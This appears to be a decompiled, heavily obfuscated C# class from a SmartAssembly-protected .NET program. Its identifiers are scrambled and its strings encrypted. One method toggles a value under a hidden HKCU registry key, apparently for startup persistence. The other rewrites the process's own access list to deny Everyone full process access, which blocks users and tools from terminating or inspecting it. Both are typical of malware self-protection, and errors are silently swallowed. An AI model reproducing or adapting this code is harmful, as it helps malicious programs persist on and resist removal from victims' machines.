using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UmXkJLRjSLdPF;

internal sealed class ulFqHoUHjZSHD
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr NxyUnrvFpLjWhjf, int YmxFerRHNjUuU, [Out] byte[] NOdcPByrtfQTLH, uint VmFpyXYbAtI, out uint lhELzhXdOcvJz);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr FQywEYZjLfDKT, int FLBJitdEZEQe, [In] byte[] ckoHHwznNio);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void WXXWMrQDLi(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107369029)));
			if (bool_0 && registryKey.GetValue(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107368380))) != null)
			{
				registryKey.DeleteValue(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107368380)));
			}
			else
			{
				registryKey.SetValue(zIVCbxjNHAKEFp.wKuxNAMIkOy(getString_0(107368380)), getString_0(107395795));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor TYwbWJZHGmS(IntPtr intptr_0)
	{
		byte[] nOdcPByrtfQTLH = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, nOdcPByrtfQTLH, 0u, out var lhELzhXdOcvJz);
		if ((long)lhELzhXdOcvJz > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, nOdcPByrtfQTLH = new byte[lhELzhXdOcvJz], lhELzhXdOcvJz, out lhELzhXdOcvJz))
		{
			return null;
		}
		return new RawSecurityDescriptor(nOdcPByrtfQTLH, 0);
	}

	private void KrSWnWBoWxxgJq(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void RIpWZcpCcygF()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = TYwbWJZHGmS(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			KrSWnWBoWxxgJq(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static ulFqHoUHjZSHD()
	{
		Strings.CreateGetStringDelegate(typeof(ulFqHoUHjZSHD));
	}
}
